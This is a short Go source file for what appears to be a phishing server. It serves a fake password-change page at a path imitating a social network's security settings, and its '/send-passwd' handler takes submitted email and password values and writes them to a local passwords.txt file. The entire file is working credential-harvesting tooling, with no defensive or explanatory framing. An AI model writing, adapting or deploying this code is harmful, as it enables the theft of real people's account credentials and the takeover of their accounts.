package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
)

const (
	dataFile = "passwords.txt"
	urlPath  = "/password_and_security/password/change"
)

func main() {
	if len(os.Args) < 2 {
		panic(fmt.Errorf("server address must be passed as an argument"))
	}
	addr := os.Args[1]
	http.HandleFunc(urlPath, htmlHandler)
	http.HandleFunc("/favicon.ico", iconHandler)
	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./static"))))
	http.HandleFunc("/send-passwd", passwordHandler)
	if err := http.ListenAndServe(addr, nil); err != nil {
		panic(err)
	}
}

func iconHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "./static/image.png")
}

func htmlHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "./static/index.html")
}

func passwordHandler(w http.ResponseWriter, r *http.Request) {
	email := r.URL.Query().Get("email")
	password := r.URL.Query().Get("password")
	if email == "" || password == "" {
		http.Error(w, "email and password are not valid", http.StatusBadRequest)
		return
	}
	f, err := os.OpenFile(dataFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		log.Printf("Error handling request, error: %s", err.Error())
		return
	}
	defer func() {
		if err := f.Close(); err != nil {
			panic(err)
		}
	}()
	fmt.Fprintf(f, "email:%s password:%s\n", email, password)
}
